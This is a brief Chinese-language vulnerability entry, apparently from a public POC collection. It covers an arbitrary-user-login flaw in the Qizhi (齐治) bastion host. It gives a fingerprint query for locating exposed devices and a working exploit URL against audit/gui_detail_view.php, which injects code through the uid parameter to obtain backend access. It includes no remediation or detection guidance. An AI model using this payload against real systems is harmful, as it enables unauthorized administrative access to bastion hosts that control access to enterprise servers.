# 齐治堡垒机 gui_detail_view.php 任意用户登录漏洞

## 漏洞描述

齐治堡垒机 存在任意用户登录漏洞，访问特定的Url即可获得后台权限

## 漏洞影响

<a-checkbox checked>齐治堡垒机</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="齐治科技-堡垒机"</a-checkbox></br>

## 漏洞复现

漏洞POC为

```plain
http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
```

![img](../../../.vuepress/public/img/qz-1.png)